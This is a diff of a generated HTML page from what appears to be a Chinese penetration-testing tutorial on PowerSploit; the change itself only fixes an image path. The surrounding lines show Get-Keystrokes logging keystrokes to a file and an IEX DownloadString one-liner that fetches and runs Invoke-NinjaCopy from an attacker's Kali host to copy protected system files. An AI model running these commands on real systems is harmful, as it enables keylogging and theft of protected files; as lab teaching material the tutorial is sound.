@@ -130,7 +130,7 @@
 <p>运行<code>Get-Keystrokes</code>并把结果记录保存到一个文件,试着运行一些字符测试一下，可以看到已被记录下来了</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Keystrokes C:\Users\testuser\Desktop\pentest.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/04/04/PowerShell-PowerSploit/pingmao/Desktop/wenzhang/PowerShell-PowerSploit/PowerShell-PowerSploit/11.png" alt></p>
+<p><img src="/2020/04/04/PowerShell-PowerSploit/11.png" alt></p>
 <h5 id="调用Invoke-NinjaCopy超级复制（需要管理员权限，可以复制受保护的运行中的系统文件）"><a href="#调用Invoke-NinjaCopy超级复制（需要管理员权限，可以复制受保护的运行中的系统文件）" class="headerlink" title="调用Invoke-NinjaCopy超级复制（需要管理员权限，可以复制受保护的运行中的系统文件）"></a>调用Invoke-NinjaCopy超级复制（需要管理员权限，可以复制受保护的运行中的系统文件）</h5><p>远程加载位于kali上的<code>Invoke-NinjaCopy.ps1</code>脚本</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.1.7:8000/PowerSploit/Exfiltration/Invoke-NinjaCopy.ps1&quot;)</span><br></pre></td></tr></table></figure>
 
